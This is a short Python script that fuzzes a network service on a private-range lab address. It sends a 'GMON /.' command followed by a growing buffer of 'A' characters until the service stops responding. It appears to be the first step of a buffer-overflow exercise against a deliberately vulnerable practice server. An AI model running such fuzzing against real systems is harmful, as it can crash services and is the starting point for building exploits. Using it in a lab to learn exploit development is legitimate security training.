import socket, sys
from time import sleep
payload=b"A"*500
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.116.140", 9999))
        s.send((b"GMON /."+payload))
        sleep(5)
        payload=payload+b"A"*500
    except:
        print("Fuzzing crashed at %s bytes"%(len(payload)))
        sys.exit() 
